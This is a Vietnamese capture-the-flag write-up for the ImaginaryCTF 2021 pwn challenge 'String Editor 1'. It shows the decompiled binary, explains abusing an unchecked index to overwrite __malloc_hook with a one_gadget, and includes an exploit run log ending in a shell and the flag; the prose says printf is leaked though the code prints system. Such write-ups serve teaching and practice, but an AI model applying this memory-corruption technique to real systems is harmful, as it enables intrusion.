<h1>Writeup imaginaryctf 2021</h1>
<h1>Author: dV</h1>
<h2>Challenge Name: String Editor 1</h2>
<h3>Phân tích file</h3>
   <h4>Các cơ chế 
  
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled)
    Ta thấy bài này Full RELRO nên không thể đè GOT.
<h3>Reversing file</h3>
  <h4>
    
    main
    {
      char *v3; // rax
      char v4; // [rsp+7h] [rbp-19h] BYREF
      __int64 v5; // [rsp+8h] [rbp-18h] BYREF
      void *ptr; // [rsp+10h] [rbp-10h]
      unsigned __int64 v7; // [rsp+18h] [rbp-8h]

      v7 = __readfsqword(0x28u);
      ptr = malloc(0x10uLL);
      setvbuf(_bss_start, 0LL, 2, 0LL);
      setvbuf(stdin, 0LL, 2, 0LL);
      v3 = (char *)ptr;
      *(_QWORD *)ptr = 0x2A2A2A2A2A2A2A2ALL;
      strcpy(v3 + 8, "********");
      puts(s);
      puts("Today, you will have the AMAZING opportunity to edit a string!");
      sleep(1u);
      printf("But first, a word from our sponsors: %p\n\n", &system);
      while ( 1 )
      {
        printf(
          "The amazing, cool, epic, astounding, astonishing, stunning, breathtaking, supercalifragilisticexpialidocious string is:\n%s\n",
          (const char *)ptr);
        puts("What character would you like to edit? (enter in 15 to get a fresh pallette)");
        __isoc99_scanf("%ld%*c", &v5);
        if ( v5 == 15 )
        {
          free(ptr);
          ptr = malloc(0x10uLL);
          strcpy((char *)ptr, "****************");
        }
        puts("What character should be in that index?");
        __isoc99_scanf("%c%*c", &v4);
        printf("DEBUG: %p\n", (char *)ptr + v5);
        *((_BYTE *)ptr + v5) = v4;
        puts("Done.");
      }
    }
    
Bài này cho ta sẵn địa chỉ hàm printf nên không cần leak, từ địa chỉ đó ta tính được libc_base và one_gadget. Bài này cho ta nhập index để edit nhưng không kiểm tra index ta nhập có hợp lệ hay không nên ta sẽ lợi dụng điều này để thay đổi __malloc_hook thành one_gadget rồi sau đó nhập index 15 để free và malloc lại lúc đó ta sẽ có shell.
Ta để ý: addr_edit = addr_data_of_heap + addr_input.
    
Để ta edit chính xác địa chỉ của malloc_hook ta tính như sau:
    
addr_input = addr_edit( addr_malloc_hook) - addr_data_of_heap
    
Để tìm được addr_data_of_heap ta chỉ cần nhập index = 0 và leak được. Vậy là đủ điều kiện để get shell.
    <h4>
      
      [+] Opening connection to chal.imaginaryctf.org on port 42004: Done
      [*] '/mnt/c/Users/ADMIN/Desktop/ctf/imageCTF/String Editor 1/string_editor_1'
          Arch:     amd64-64-little
          RELRO:    Full RELRO
          Stack:    No canary found
          NX:       NX enabled
          PIE:      PIE enabled
      [*] '/mnt/c/Users/ADMIN/Desktop/ctf/imageCTF/String Editor 1/libc.so.6'
          Arch:     amd64-64-little
          RELRO:    Partial RELRO
          Stack:    Canary found
          NX:       NX enabled
          PIE:      PIE enabled
      System:  0x7f5599616410
      Base:  0x7f55995c1000
      __malloc_hook:  0x7f55997acb70
      One:  0x7f55996a7c81
      Heap:  0x561d046602a0
      [*] Switching to interactive mode
      DEBUG: 0x7f55997acb77
      Done.
      The amazing, cool, epic, astounding, astonishing, stunning, breathtaking, supercalifragilisticexpialidocious string is:
      a***************
      What character would you like to edit? (enter in 15 to get a fresh pallette)
      $ cat flag.txt
      ictf{alw4ys_ch3ck_y0ur_1nd1c3s!_4e42c9f2}
      $
